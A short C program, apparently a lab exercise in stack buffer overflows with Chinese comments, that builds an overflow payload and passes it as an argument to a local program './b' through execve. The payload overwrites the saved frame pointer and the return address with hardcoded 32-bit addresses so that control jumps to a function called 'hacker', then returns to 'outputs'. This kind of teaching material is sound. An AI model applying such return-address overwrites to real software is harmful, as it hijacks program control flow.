#include <stdio.h>
#include <string.h>
char code[] =
"0123456789abcdef"  // buffer不越界的字节内容
"abcdabcd"          // buffer与ebp旧值之间需要填充的内容
"\x18\xfe\xff\xbf"  // b的main的ebp值
"\x8c\x91\x04\x08"  // hacker的首地址
"\xc9\x91\x04\x08"; // outputs的返回地址

int main(int argc, char **argv) {
    char *arg[3];
    arg[0] = "./b";
    arg[1] = code;
    arg[2] = NULL;
    execve(arg[0], arg, NULL);
    return 0;
}
